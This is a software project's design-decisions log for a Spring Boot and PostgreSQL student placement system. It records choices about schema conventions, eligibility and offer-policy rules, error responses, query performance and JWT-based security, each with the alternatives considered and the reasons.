# Design Decisions

Each entry records what we decided, what else we considered, and why.

---

## 1. Run PostgreSQL locally via Docker Compose
**Milestone:** 1 · **Date:** 2026-11-01

**Decision:** Run the dev database as a `postgres` container defined in `docker-compose.yml`, with credentials taken from a git-ignored `.env` file and data kept in a named volume (`pgdata`).

**Alternatives:**
- Install PostgreSQL directly on Windows.
- Use a cloud database (Neon/Supabase) during development.

**Why:** One command (`docker compose up -d`) gives every developer the same database version and settings, with nothing installed on the OS. A cloud DB would need internet access and would be shared. The named volume keeps data across restarts, and the healthcheck tells us when Postgres is actually ready to accept connections.

---

## 2. PostgreSQL 17 instead of 18
**Milestone:** 1 · **Date:** 2026-11-01

**Decision:** Pin the image to `postgres:17` (a major version, so we still get minor/security updates).

**Alternatives:**
- `postgres:18` (newest major).
- `postgres:latest` (unpinned).

**Why:** Our planned production hosts (Neon/Supabase) fully support 17, so dev and prod stay on the same major version. The 17 image also uses the familiar data directory (`/var/lib/postgresql/data`), whereas 18 changed the volume layout. `latest` was rejected because a silent major upgrade could break the existing data volume.

---

## 3. `spring.jpa.hibernate.ddl-auto: none`. Flyway will own the schema
**Milestone:** 1 · **Date:** 2026-11-01

**Decision:** Hibernate never creates or alters tables. From Milestone 2, the schema is defined only by versioned Flyway SQL migrations (`V1__init.sql`, …).

**Alternatives:**
- `update`: Hibernate changes tables to match the entities.
- `create-drop`: Hibernate rebuilds the schema on every start.

**Why:** `update` can't safely rename or drop columns and leaves no history, and `create-drop` wipes data. Versioned migrations give a reviewable, repeatable schema history that runs the same way locally and in production. We also set `open-in-view: false` so database access happens only inside services, not while the web response is being written.

---

## 4. JVM default timezone set to UTC
**Milestone:** 1 · **Date:** 2026-11-01

**Decision:** Set the JVM timezone to UTC in two places:
- `TimeZone.setDefault(UTC)` at the start of `main()`, which covers VS Code, `java -jar`, Docker and `spring-boot:run`.
- `-Duser.timezone=UTC` in the Surefire `argLine`, which covers tests, because `@SpringBootTest` never calls `main()`.

**Alternatives:**
- Set the timezone to `Asia/Kolkata`.
- Pass `-Duser.timezone` only on the command line.
- Leave the default.

**Why:** On Windows in India, Java reports the legacy zone ID `Asia/Calcutta`. The PostgreSQL JDBC driver sends that ID when it connects, and Postgres 17 rejects it (`FATAL: invalid value for parameter "TimeZone"`), so the app couldn't start. UTC is the usual choice for servers: timestamps are stored the same way whether the app runs on a laptop or on a cloud host, and the frontend converts them to IST for display. A command-line-only flag would be easy to forget.

## 5. Hikari connection timeout of 5 seconds
**Milestone:** 1 · **Date:** 2026-11-01

**Decision:** `spring.datasource.hikari.connection-timeout: 5000` (ms).

**Alternatives:** Keep Hikari's default of 30 seconds.

**Why:** When the database is down, any request that needs a connection waits for this timeout. With 30 s, `/api/health` and every other request would hang for half a minute before failing. With 5 s, it returns `503` quickly, which is better for users and for health checks run by the hosting platform.

## 6. Schema conventions: identity IDs, TIMESTAMPTZ, enums as VARCHAR + CHECK
**Milestone:** 2 · **Date:** 2026-11-01

**Decision:**
- IDs are `BIGINT GENERATED BY DEFAULT AS IDENTITY`.
- Every timestamp is `TIMESTAMPTZ`.
- Every enum (role, job type, drive status, application status, round result, policy type) is `VARCHAR` with a `CHECK` constraint.
- Number rules are checked in the DB: CGPA 0–10, backlogs ≥ 0, CTC > 0.
- Every constraint has a name (`uq_`, `fk_`, `ck_` prefixes).

**Alternatives:**
- `SERIAL` IDs.
- `TIMESTAMP` without a time zone.
- Native Postgres `ENUM` types.
- Validation in Java only.

**Why:** Identity columns are the SQL-standard replacement for `SERIAL`. `TIMESTAMPTZ` stores an exact instant, so it can't be misread whatever timezone a client uses. Adding a value to a native `ENUM` needs `ALTER TYPE` and is awkward in migrations, while a CHECK can be swapped in one migration, and JPA's `@Enumerated(STRING)` maps to `VARCHAR` with no extra work. DB-level CHECKs are the last line of defence even if a bug skips Bean Validation. Named constraints make error messages readable (`ck_student_profiles_cgpa`).

## 7. `applications.student_id` references `student_profiles`, not `users`
**Milestone:** 2 · **Date:** 2026-11-01

**Decision:** The applicant FK points to `student_profiles(id)`.

**Alternatives:** Reference `users(id)`.

**Why:** Only students apply, and the profile holds the data eligibility needs (CGPA, branch, backlogs, graduation year). The FK guarantees every applicant has a profile and that an admin account can never be an applicant. Ownership checks go JWT user → `student_profiles.user_id` (UNIQUE) → profile.

---

## 8. ON DELETE RESTRICT everywhere except `drive_branches` (CASCADE)
**Milestone:** 2 · **Date:** 2026-11-01

**Decision:** All foreign keys are `ON DELETE RESTRICT`, except `drive_branches.drive_id`, which is `ON DELETE CASCADE`.

**Alternatives:**
- CASCADE on all parent → child links (for example drive → applications, round → results).
- `SET NULL`.

**Why:** In v1 we close or deactivate things instead of deleting them: a drive with applicants becomes `CLOSED`. RESTRICT makes a mistaken delete fail loudly instead of silently erasing applications, round results or audit history. `drive_branches` rows mean nothing without their drive, so CASCADE is safe there. `round_results → drive_rounds` stays RESTRICT on purpose, because results are records of what happened.

---

## 9. Explicit indexes on foreign keys and filter columns
**Milestone:** 2 · **Date:** 2026-11-01

**Decision:**
- Every FK column is indexed, either by its own index or as the first column of a PK/UNIQUE index.
- Extra indexes on `drives.status`, `applications.status`, `audit_logs (entity_type, entity_id)` and `audit_logs.created_at`.

**Alternatives:** Rely on primary keys only.

**Why:** Postgres indexes primary keys and UNIQUE constraints automatically, but **not** foreign keys. Without these indexes, joins like "applications of student X" and the RESTRICT checks on delete would scan whole tables. We don't add a separate `applications.drive_id` index, because `UNIQUE (drive_id, student_id)` already starts with `drive_id`.

## 10. Fixed branch codes, NOT NULL drive criteria, final withdrawal
**Milestone:** 2 · **Date:** 2026-11-01

**Decision:**
- `branch` must be one of `CSE, IT, ECE, EEE, ME, CE`. A CHECK enforces this on both `student_profiles` and `drive_branches`.
- `min_cgpa`, `max_backlogs` and `graduation_year` on drives are NOT NULL. "No cut-off" is `min_cgpa = 0`.
- Withdrawal is final: `UNIQUE (drive_id, student_id)` blocks re-applying, and the API returns a clear message.

**Alternatives:**
- A free-text branch.
- A `branches` lookup table.
- Nullable criteria meaning "no limit".
- Reusing the withdrawn row when a student re-applies.

**Why:** With free text, "CSE" and "Computer Science" would silently fail to match. A lookup table is more than v1 needs, and adding a branch is a one-line migration. NOT NULL criteria keep `EligibilityService` free of "null means no limit" special cases. A final withdrawal keeps the status history simple and auditable.

## 11. Separate `INELIGIBLE` status with `status_reason`
**Milestone:** 2 · **Date:** 2026-11-01

**Decision:**
- Application status adds `INELIGIBLE`, used when an admin edits drive criteria and an existing application no longer qualifies.
- A nullable `status_reason VARCHAR(300)` holds the human-readable reason.
- `REJECTED` is kept only for company rejections in rounds.
- A blocked apply (not eligible, or blocked by a policy) creates **no row**. Its reason goes back in the API error response.

**Alternatives:**
- Reuse `REJECTED` for both cases.
- Delete the application.

**Why:** "The company rejected you" and "the rules changed after you applied" mean different things to a student, and a TPO needs to tell them apart in a dispute. Keeping the row, with a reason, plus an audit-log entry makes the change explainable and auditable (edge feature #2).

## 12. Flyway seed data with a demo BCrypt password
**Milestone:** 2 · **Date:** 2026-11-01

**Decision:**
- `V2__seed_demo_data.sql` inserts 1 admin, 6 students, 3 fictional companies, 5 drives and the 3 policy rows.
- Every account uses the demo password `Demo@1234`, stored as a BCrypt (cost 10) hash. The hash was generated once with Spring Security's `BCrypt` class, run through `jshell` outside the project.
- Rows are linked by natural keys, not hard-coded IDs, and deadlines are relative to `now()`.
- Policy defaults: `DREAM_OFFER` active at 10 LPA, `ONE_OFFER` and `MAX_OFFERS` inactive.

**Alternatives:**
- Seed from Java code at startup.
- Commit no seed data.
- Use a plain-text password.

**Why:** A migration gives every fresh database the same realistic data, which makes eligibility demos interesting from day one. Natural-key joins keep the script independent of identity values. Relative deadlines keep OPEN drives open whenever the DB is recreated.

**⚠️ Before deployment (Milestone 12):** the demo password is public (it's in the README). The production admin must be created from **environment variables** (for example `ADMIN_EMAIL` and `ADMIN_PASSWORD`, hashed at startup), and the demo seed must not run in production. One way is to move it to a separate Flyway location that only the dev profile enables.

## 13. `ddl-auto: validate` with hand-written entities
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:**
- Switch `spring.jpa.hibernate.ddl-auto` from `none` to `validate`.
- Entities use `Short` for `SMALLINT` columns, `BigDecimal` for `NUMERIC`, `Instant` for `TIMESTAMPTZ`, `LocalDate` for `DATE`, and `@Enumerated(STRING)` for enums.
- `drive_branches` is mapped as an `@ElementCollection` of the `Branch` enum on `Drive`.

**Alternatives:**
- Keep `none`.
- Use `Integer` for `SMALLINT`.
- Map `drive_branches` as a separate `@Entity`.

**Why:** `validate` makes Hibernate compare entities with the Flyway schema at startup and refuse to start on a mismatch (a missing column, a wrong type), without ever changing the schema. It catches mapping bugs on day one instead of on the first query. `Integer` against `SMALLINT` fails validation, so the entity uses `Short` and DTOs convert. Branches have no identity of their own, so an element collection is simpler than a separate entity.

## 14. One global exception handler, with the DB as a backstop for conflicts
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:**
- A single `@RestControllerAdvice` returns `{timestamp, status, error, message, path}` for every error:

| Status | Cases |
|---|---|
| 400 | validation, malformed JSON, wrong parameter type, unknown sort field |
| 404 | not found, unknown URL |
| 405 | wrong method |
| 409 | `ConflictException`, plus DB constraint violations mapped from the constraint name to a friendly message |
| 500 | everything else: generic message, stack trace logged on the server only |

- Services check business conflicts first (duplicate name, company has drives). The DB constraint is the backstop for race conditions.

**Alternatives:**
- Per-controller `try/catch`.
- Spring's default error JSON or `ProblemDetail`.
- Relying only on DB constraints.

**Why:** Clients (the React frontend, Postman) can rely on a single error shape. Service checks give the clearest messages, and the DB constraint guarantees correctness when two requests race. Without the extra 400/404/405 handlers, the catch-all would wrongly report client mistakes as 500s.

## 15. `PageResponse<T>` and capped page sizes
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:**
- Lists return `PageResponse<T>(content, page, size, totalElements, totalPages)`.
- Page size defaults to 20 and is capped at 100 (`spring.data.web.pageable.*`).
- Pages are 0-based, and a size larger than 100 is quietly capped.

**Alternatives:**
- Return Spring's `Page` directly.
- Use custom `page`/`size` parameters.

**Why:** Spring's `Page` JSON is an internal structure that can change between versions, and Spring Data itself warns against serialising it. Our own record is a stable API contract for the frontend. The cap stops a client from asking for 1 million rows.

## 16. Known limitation: company name uniqueness is case-insensitive only in the service
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:**
- `CompanyService` rejects duplicate names ignoring case (`existsByNameIgnoreCase`).
- The DB constraint `uq_companies_name` is case-sensitive.
- We are **not** adding a `lower(name)` unique index for now.

**Alternatives:** A `V3` migration that replaces the constraint with `CREATE UNIQUE INDEX ... ON companies (lower(name))`.

**Why:** Only TPO admins create companies, so concurrency is very low. Two simultaneous creates of "Acme" and "acme" are the only way to get past the check, and that is unlikely. In a 10-parallel-request test, the service check caught all 9 duplicates. Revisit this if more roles can create companies.

## 17. Entity → DTO mapping happens inside `@Transactional` service methods
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:**
- Services return DTOs, never entities.
- Hand-written `@Component` mappers (for example `CompanyMapper`) also trim input and turn blank strings into `null`.

**Alternatives:**
- Map in controllers.
- Turn `open-in-view` back on.
- Use MapStruct.

**Why:** With `open-in-view: false` and LAZY relationships (Drive → Company), touching a lazy field after the transaction ends throws `LazyInitializationException`. Mapping inside the transaction makes that impossible, and it keeps entities out of the web layer. MapStruct isn't in our stack, and hand-written mappers are easy to read and explain.

---

## 18. Drive status transitions as explicit endpoints, with the rules in one map
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:**
- Status changes only through `POST /api/drives/{id}/open | /close | /complete`. `PUT` never changes the status, and a new drive always starts as `DRAFT`.
- All the rules live in `DriveService`:
  - `ALLOWED_TRANSITIONS` = DRAFT→OPEN, OPEN→CLOSED, CLOSED→COMPLETED.
  - `EDITABLE_STATUSES` = DRAFT, OPEN.
  - `checkCanOpen()`: the deadline must be in the future and there must be at least one branch.
- `checkCanOpen()` runs again whenever an OPEN drive is edited, so an OPEN drive can never become invalid.
- Every blocked change is a 409 that names the allowed next step.

**Alternatives:**
- Let `PUT` change `status`.
- A generic `PATCH {status}`.
- Put the rules in the entity or spread `if`s across methods.

**Why:** Each endpoint is one clear action, which is easy to secure per role later and easy to audit. Keeping the rules in one map makes them easy to read, explain and test: 12 parameterised cases cover every from → to combination. The unit tests use their own hand-written list of allowed transitions, so they would catch a wrong entry in the map.

---

## 19. Avoid N+1 on the drives list: `@EntityGraph` for company, `@BatchSize` for branches
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:**
- `DriveRepository.search` uses `@EntityGraph(attributePaths = "company")`.
- `Drive.branches` has `@BatchSize(size = 100)`.
- The filters are optional JPQL parameters (`:status IS NULL OR ...`).

**Alternatives:**
- `JOIN FETCH` both the company and the branches.
- A global `hibernate.default_batch_fetch_size`.
- Turn on EAGER fetching.

**Why:** It was measured with SQL logging on 5 drives:

| | Queries per request |
|---|---|
| Before | 9: 1 for the drives, 3 for companies, 5 for branches. It grows with page size, so about 200 for 100 drives. |
| After | 2: drives JOINed with companies, then one `drive_id = any(?)` query for the branches. A `count(*)` is added when there's more than one page. |

The company is a many-to-one, so JOINing it keeps one row per drive and paging still works in SQL. The branches are a collection: `JOIN FETCH` with paging makes Hibernate load every row and page them in memory (warning HHH90003004), so they're batch-loaded instead. EAGER would load them everywhere, even where they aren't needed.

## 20. `CurrentUserProvider` interface with a temporary demo-admin implementation
**Milestone:** 3 · **Date:** 2026-11-01 · **Implementation superseded by [24](#24-temporary-identity-via-the-x-demo-user-id-header) and then [33](#33-jwtcurrentuserprovider-replaces-the-demo-header). The interface itself stays.**

**Decision:**
- Services ask `CurrentUserProvider.currentUserId()` who is calling.
- Until Milestone 5, `DemoAdminCurrentUserProvider` returns the id of `admin@placementhub.dev`, looked up by email. It is marked TODO for Milestone 5.
- `createdBy` uses `getReferenceById`, which doesn't need an extra SELECT.

**Alternatives:**
- Hard-code `createdBy = 1`.
- Make `created_by` nullable.
- Build JWT login now.

**Why:** `DriveService` depends on *what* it needs (the current user's id), not *how* it is found. In Milestone 5 we add a JWT-based implementation and delete the demo one, and the services and their tests don't change. In tests we just mock the interface. Looking the admin up by email avoids relying on identity values.

## 21. Injected `Clock` for time-based rules
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:** A `Clock` bean (`Clock.systemUTC()`) is injected into services. Services call `Instant.now(clock)`, never `Instant.now()`.

**Alternatives:** Call `Instant.now()` directly.

**Why:** Rules like "the deadline must be in the future" depend on the current time. With a fixed `Clock` in tests, these rules are tested exactly, including the "deadline is exactly now" edge case, without flaky time-dependent tests. This will matter again for "withdraw before the deadline" in Milestone 4.

## 22. Known limitation: unknown enum values in a JSON body give a generic 400
**Milestone:** 3 · **Date:** 2026-11-01

**Decision:** For now, a body like `"branches": ["XYZ"]` returns 400 "Malformed JSON request body", without naming the field.

**Alternatives:** Inspect Jackson's `InvalidFormatException` in the handler and say, for example, "Invalid value 'XYZ' for branches. Allowed: CSE, IT, ...".

**Why:** The status code is correct and the request is rejected safely. The friendlier message is a small improvement best done in the Milestone 11 testing pass, or when the frontend needs it (the frontend sends enum values from dropdowns, so this is rare).

## 23. Students can edit only their name and phone; academic fields are read-only
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:**
- `PUT /api/students/me` accepts only `fullName` and `phone`.
- CGPA, active backlogs, branch, graduation year and roll number can't be changed by students:
  - the request DTO has no such fields;
  - the entity has no setters for them;
  - unknown JSON fields (e.g. `"cgpa": 9.9`) are ignored, which is Spring Boot's default.
- Admin-side updates to academic data are a later concern.

**Alternatives:**
- One shared profile DTO with a check on "who is editing".
- Reject unknown fields with 400 (`FAIL_ON_UNKNOWN_PROPERTIES`) for every endpoint.

**Why:** Eligibility decisions are only trustworthy if a student can't raise their own CGPA or clear their own backlogs. Leaving the fields out of the DTO is a structural guarantee: no code path exists that could copy them. The demo confirmed it: a PUT with `cgpa: 9.9, branch: IT, rollNo: HACKED` changed only the name and phone. Ignoring unknown fields keeps the API forgiving for clients, and the response shows the unchanged values.

## 24. Temporary identity via the `X-Demo-User-Id` header

**Decision:** `DemoHeaderCurrentUserProvider` replaces `DemoAdminCurrentUserProvider`:

| Header | Result |
|---|---|

| A number | that user, or 404 if the user doesn't exist |
| Not a number | 400 |

- `CurrentStudentResolver.requireProfile()` maps the current user to their profile, with a 404 "Student profile not found" for users who have none (such as the admin).

**Alternatives:**

- Pass `studentId` as a path or query parameter.

**Why:** It lets us demo and test student flows as different seeded students before login exists. Because services only use `CurrentUserProvider` and `CurrentStudentResolver`, Milestone 5 only replaces the header class. **It is NOT secure**, because anyone can send any id. It is marked TODO and deleted in Milestone 5. A path parameter like `/students/3` would bake an insecure pattern into the API design.

## 25. `EligibilityService` is pure logic and reports every failing reason
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:**
- `evaluate(StudentProfile, Drive, Instant now)` has no dependencies and makes no repository or clock calls. The caller passes `now`, from the `Clock` bean.
- It checks all 6 rules in a fixed order (drive status, deadline, branch, CGPA, backlogs, batch) and returns every failing reason.
- Boundaries:
  - CGPA equal to the minimum passes, compared with `BigDecimal.compareTo`, because `7.5` and `7.50` aren't `equals`.
  - Backlogs equal to the maximum pass.
  - A deadline exactly "now" fails.
- Messages include the real numbers, and deadlines are shown in IST (`Asia/Kolkata`) because students read them.

**Alternatives:**
- Stop at the first failure.
- Let the service load data itself.
- Use the Strategy pattern now.

**Why:** A pure function is trivial to unit-test (23 tests, no mocks, milliseconds) and can be reused for browse (now), apply (Session B) and criteria-change re-evaluation (Milestone 7). Listing every reason saves students from fixing one problem only to discover the next. The Strategy pattern is reserved for placement policies (Milestone 6), where rules are configurable. Eligibility rules are fixed, so a plain method is clearer.

## 26. Known limitation: "eligible only" browsing filters and pages in memory
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:** `GET /api/students/me/drives` loads **all OPEN drives**, evaluates each one with `EligibilityService`, filters if `eligibleOnly=true`, and pages in memory.
- It always runs 4 queries: the header check, the profile with the user, the drives JOIN companies, and the branches batch.
- Only `page` and `size` are supported, not `sort`. Drives are always sorted by the soonest deadline.

**Alternatives:** Repeat the rules as SQL `WHERE` conditions, so the DB filters and pages.

**Why:** `EligibilityService` stays the **single source of truth**. With rules in both SQL and Java, they could drift apart, and a drive might be listed as eligible but then fail on apply. A college has tens of OPEN drives at a time, so this is cheap. **Limit:** it's fine up to a few hundred OPEN drives. Beyond that, move to SQL pre-filtering, with Java still producing the reasons.

## 27. Optional `details` array in the error JSON; 422 for "not eligible"
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:**
- `ErrorResponse` gains an optional `details: string[]`, annotated `@JsonInclude(NON_NULL)`.
- An ineligible apply returns **422** with `message` = "You are not eligible for this drive" and `details` = every eligibility reason.
- Duplicates and "withdrawal is final" stay **409**.

**Alternatives:**
- Join all the reasons into the `message` string.
- A separate error format for 422.
- Use 409 or 400 for "not eligible".

**Why:**
- Every existing error looks **exactly the same**, because the key is left out when it's null, so no client breaks. The demo confirmed that a 404 still has only the 5 keys.
- `message` stays a single readable sentence for a toast, and `details` is an array the frontend can show as bullets without splitting strings.
- On the status codes:
  - 400 means "your request is malformed".
  - 409 means "it clashes with existing state", such as a duplicate.
  - 422 means "well-formed, but business rules about you say no". That is exactly "not eligible".

## 28. Apply: checks in a fixed order, with the DB UNIQUE constraint as the real duplicate guard
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:** `ApplicationService.apply` runs these steps in order:

| # | Step | Failure |
|---|---|---|
| 1 | Load the profile | 404 |
| 2 | Load the drive (a `DRAFT` drive counts as missing) | 404 |
| 3 | Look for an existing application | 409 "already applied", or "withdrawal is final" if it was withdrawn |
| 4 | `EligibilityService` | 422 with the reasons |
| 5 | Policy engine hook (Milestone 6) | — |
| 6 | `saveAndFlush` | — |

- If `saveAndFlush` throws a `DataIntegrityViolationException` for `uq_applications_drive_student`, it becomes the same 409. Any other constraint error is re-thrown unchanged.

**Alternatives:**
- Rely only on the "already applied?" check.
- Use pessimistic locks.
- Let the global handler map the constraint error.

**Why:** A check-then-insert has a race: two simultaneous requests both see "no application" and both insert. Only the DB constraint is atomic, so it is the real guard, and the check exists to give a nicer message in the normal case. `saveAndFlush` forces the INSERT to happen inside the `try`, not later at commit time. Mapping it in the service makes the behaviour unit-testable: the test makes the mocked repository throw the real exception type. The global handler also knows the constraint, as a backstop. The duplicate check runs **before** eligibility, so a student who already applied isn't told "you're not eligible". `DRAFT` drives return 404 because they are unpublished, and students shouldn't learn they exist.

## 29. Another student's application returns 404, not 403
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:** Students read and withdraw applications through `findByIdAndStudentId(id, myProfileId)`. A missing application and someone else's application both return **404** "Application with id X not found".

**Alternatives:** Load by id, then return 403 if the owner differs.

**Why:**
- A 403 confirms the resource exists ("it's there, just not yours"). That lets anyone discover which application ids exist and roughly how many applications there are, by trying ids one by one (enumeration).
- A student has no legitimate need to know about other students' applications, so "not found for you" is the correct answer.
- Putting the owner into the query means the ownership check can't be forgotten in one endpoint.
- Milestone 5 keeps this pattern; JWT only changes how "me" is found.

## 30. Withdrawal needs an OPEN drive and must happen before the registration deadline
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:** A student may withdraw only when all of these are true:

| Condition | Message if not |
|---|---|
| The application is `APPLIED` or `SHORTLISTED` | "You have already withdrawn this application", or "Cannot withdraw a SELECTED application. Only APPLIED or SHORTLISTED applications can be withdrawn" |
| The drive is `OPEN` | "Withdrawal is not allowed: this drive is no longer open (status: CLOSED)" |
| `now` is before the registration deadline | "Withdrawal closed on 11 Nov 2026, 3:30 PM IST (the registration deadline)" |

- Withdrawal is final, so re-applying gets a 409.

**Alternatives:**
- Check only the deadline, which would let students withdraw from a drive an admin closed early.
- Allow withdrawal at any time before the student is selected.

**Why:** Once an admin closes a drive, the applicant list is being shortlisted and shared with the company. Students leaving after that would quietly change a list the TPO has already acted on. Tying withdrawal to "OPEN and before the deadline" gives one clear window that students and admins both understand. Both conditions are unit-tested, including a CLOSED drive whose deadline hasn't passed yet.

## 31. `applicationStatus` in the browse list with one batched query
**Milestone:** 4 · **Date:** 2026-11-01

**Decision:**
- `StudentDriveResponse` gains `applicationStatus`, which is null if the student hasn't applied.
- It's loaded with **one** JPQL query, `SELECT new DriveApplicationStatus(a.drive.id, a.status) ... WHERE a.student.id = :sid AND a.drive.id IN :driveIds`, and turned into a `Map<driveId, status>`.
- The query is skipped when there are no OPEN drives. Browse now runs 5 queries in total, however many drives there are.

**Alternatives:**
- Look up the status per drive, which is N+1.
- Load full `Application` entities.
- Make it a lazy association on `Drive`.

**Why:** A constructor-expression projection loads only the two columns needed, with no entities and no lazy fields. One `IN (...)` query for the whole list keeps the query count fixed, just like the branches batch.

## 32. Stateless JWT with Spring Security's OAuth2 Resource Server (HS256), no custom filter
**Milestone:** 5 · **Date:** 2026-11-01

**Decision:**
- Tokens are issued with Spring's `JwtEncoder` and validated on every request by Spring's built-in bearer-token filter with `JwtDecoder`. Both are `NimbusJwtEncoder`/`NimbusJwtDecoder` built with `withSecretKey(...)`, using HS256.
- **Claims:**
  - `sub` = user id (as a string);
  - `role`, which a `JwtAuthenticationConverter` maps to `ROLE_STUDENT` or `ROLE_TPO_ADMIN`;
  - `email`, `iss = placementhub`, `iat` and `exp`.
- **Expiry:** 2 hours (`JWT_EXPIRY`, default `PT2H`).
- **Sessions:** stateless, with CSRF, HTTP Basic, form login and logout turned off.
- **Errors:** custom `AuthenticationEntryPoint` (401) and `AccessDeniedHandler` (403) write our standard error JSON. Spring's defaults return empty bodies.

**Alternatives:**
- A hand-written `OncePerRequestFilter` that parses tokens.
- A third-party JWT library (jjwt, auth0).
- Server-side sessions.
- RS256 key pairs.

**Why:**
- **Spring's filter instead of our own:** it already does extraction, signature, `exp`/`nbf` with clock skew, issuer checks, and creating the `Authentication`. A custom filter would re-implement reviewed security code, and its classic bugs (forgetting expiry, accepting `alg: none`, comparing signatures in a non-constant-time way) are how JWT systems get broken. We call only Spring's API; Spring Security uses Nimbus internally, and there's no extra dependency in our `pom`.
- **HS256:** one service both issues and checks tokens, so a shared secret is simplest. RS256 would matter only if *other* services had to verify tokens without being able to issue them.
- **2-hour expiry:** there are no refresh tokens in v1, and a stateless JWT can't be revoked, so expiry is the only limit on a stolen token. 2 hours covers a realistic work session. 15 minutes would log users out all the time without refresh tokens, and 24 hours makes a leak last too long.
- **CSRF off:** CSRF works because browsers automatically attach cookies to cross-site requests. Our token travels in the `Authorization` header, which browsers never attach automatically, and there's no session cookie, so a forged request carries no credentials. **If we ever store the token in a cookie, CSRF protection must come back.**

**Tests:** 51 MockMvc access-matrix tests (11 endpoints × no token, bad token, wrong role, right role, plus edge cases) run through the real `SecurityConfig` with real tokens.

## 40. What counts as an offer, and when policies apply
**Milestone:** 6 · **Date:** 2026-11-02

**Decision:**
- An **offer** is an application with status `SELECTED` in a `FULL_TIME` drive.
- Policies only restrict applying to **`FULL_TIME` drives**. Internship drives are never blocked by a policy, though eligibility still applies.
- One query (`ApplicationRepository.findSelectedOffers`) loads every `SELECTED` application, internships included, as a small `Offer(companyName, ctcLpa, jobType)` record. `PolicyEngine` then keeps only the `FULL_TIME` ones.
- The rules:
  - `ONE_OFFER`: blocked once the student holds 1 offer.
  - `MAX_OFFERS` (N): blocked once offers ≥ N.
  - `DREAM_OFFER` (T): allowed with 0 offers, or with exactly 1 offer below T when the new drive's CTC ≥ T (the one upgrade). Everything else is blocked: the offer is already ≥ T, the new drive is below T, or the student holds 2+ offers.
- Every message names the real company and CTC, e.g. "Dream-offer policy: you hold an offer of 5.00 LPA from Kaveri Analytics; you may only apply to drives of 10.00 LPA or more (this drive offers 6.50 LPA)".

**Alternatives:**
- Count internship selections as offers too.
- Filter by job type in the SQL query.

**Why:** In Indian placements, an internship selection shouldn't use up a student's full-time chances. Filtering in Java rather than SQL keeps the offer definition in one place (`PolicyEngine`) and makes "internship offers are not counted" a plain unit test. Loading the few extra internship rows costs nothing. CTCs are compared with `compareTo`, so 10 and 10.00 are equal: a drive *exactly* at the threshold counts as an upgrade, and an offer exactly at the threshold counts as a dream offer.

## 41. `PolicyRule` signature: settings in, `StudentProfile` out, `Offer` instead of `Application`
**Milestone:** 6 · **Date:** 2026-11-02

**Decision:** The interface in CLAUDE.md changed from
`PolicyResult evaluate(StudentProfile s, Drive d, List<Application> offers)` to:

```java
public interface PolicyRule {
    PolicyType type();
    PolicyResult evaluate(PolicySettings settings, Drive drive, List<Offer> offers);
}
```

- `PolicySettings(ctcThresholdLpa, maxOffers)` is copied from the policy's DB row.
- Each rule is a stateless Spring `@Component`. `PolicyEngine` receives all of them as `List<PolicyRule>`, maps them by `type()`, and fails at startup if a type has no rule or two.

**Alternatives:**
- Keep the original signature and put the settings in each rule's constructor (`new DreamOfferRule(threshold)`), built by a factory.
- Pass the whole `PlacementPolicy` entity.

**Why:**
- **Settings as a parameter:** the threshold and limit live in the DB and admins change them at runtime, so they must come in on every call. A constructor factory would need a `switch` that you edit for every new rule. With beans looked up by type, a 4th rule is one new class, which is the point of the Strategy pattern.
- **No `StudentProfile`:** no rule reads it, because the offers already belong to the student. An unused parameter would mislead readers.
- **`Offer` instead of `Application`:** messages need the company name and CTC. A constructor-expression query loads exactly those, with no lazy entities, so there's no `LazyInitializationException` and no N+1. It's also trivial to build in tests.
- **A small record instead of the entity:** it keeps rules independent of JPA and easy to test.

## 42. Eligibility and policies combined: one 422, one `eligible` flag
**Milestone:** 6 · **Date:** 2026-11-02

**Decision:**
- **Apply:** the order is still duplicate check (409) → eligibility → policies → insert. If eligibility *or* policies fail, there's a single 422 with **all** reasons, eligibility first. The message is "You are not eligible for this drive" when eligibility fails, otherwise "This application is blocked by a placement policy". No row is created (decision 11).
- **Browse:** `eligible` = eligibility passed AND no policy blocked. `reasons` = eligibility reasons + policy reasons. The "eligible only" filter therefore also hides policy-blocked drives. The response shape is unchanged.
- **The engine:** every active rule must allow. It reports *every* blocking reason, in a fixed order (ONE, DREAM, MAX), like `EligibilityService`.
- **Query count:**
  - Browse loads the active policies and the student's offers **once** for all drives: at most 5 queries, however many drives there are. The offer query is skipped when no policy is active.
  - Apply runs no policy queries for internship drives, or when no policy is active.

**Alternatives:**
- Two separate 422s (eligibility first, policies only once eligible).
- A separate `policyBlocked` field in browse.

**Why:** Browse and apply should never disagree. If browse lists two reasons, apply should give the same two. Showing everything at once saves the student from fixing one problem only to discover the next. `PolicyEngine` is pure logic, which is what lets browse load the data once and evaluate it per drive in memory.

## 43. ONE_OFFER and DREAM_OFFER can't both be active (409), checked under a row lock
**Milestone:** 6 · **Date:** 2026-11-02

**Decision:**
- Activating `ONE_OFFER` while `DREAM_OFFER` is active, or the reverse, returns **409** "Cannot activate ONE_OFFER while DREAM_OFFER is active: the two policies contradict each other. Deactivate DREAM_OFFER first". Deactivating is always allowed. `MAX_OFFERS` can be combined with either.
- `PolicyService.update` first locks all policy rows with `SELECT … FOR UPDATE` (`@Lock(PESSIMISTIC_WRITE)`, `ORDER BY id`). The lock is held until commit.

**Alternatives:**
- Let the engine resolve the overlap (for example, "ONE_OFFER wins").
- A DB trigger or constraint across rows.
- Check without a lock.

**Why:**
- **Why forbid it:** ONE_OFFER forbids exactly the upgrade DREAM_OFFER allows. If both were on, the strictest rule would silently win, and the TPO would think dream offers were possible. Refusing the setting with a clear message is more honest than resolving it silently.
- **Why lock:** without a lock, two admins could activate ONE_OFFER and DREAM_OFFER at the same moment, and each request would see the other policy as still inactive. With the lock, the second admin waits for the first commit and then sees the conflict.
- **Why `ORDER BY id`:** every transaction locks the rows in the same order, so two updates can't deadlock.
- **Why not a DB constraint:** a `CHECK` can't compare two rows, and a trigger would hide business rules in SQL.

